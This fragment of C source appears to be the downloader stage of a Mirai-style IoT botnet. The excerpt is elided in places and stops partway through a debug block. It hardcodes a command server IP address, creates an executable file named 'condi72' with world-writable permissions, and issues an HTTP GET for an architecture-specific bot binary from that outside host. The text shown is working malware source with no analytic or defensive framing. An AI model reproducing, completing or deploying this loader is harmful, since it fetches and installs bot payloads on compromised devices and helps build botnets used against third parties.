...
#define HTTP_SERVER utils_inet_addr(115,76,19,84) //IP MIRAI HERE

#define EXEC_MSG            "Loadinggg\n"
#define EXEC_MSG_LEN        10

#define DOWNLOAD_MSG        "Downloaddd\n"
#define DOWNLOAD_MSG_LEN    11
...
inline void run(void)
{
    ...
    ffd = open("condi72", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /main_" BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
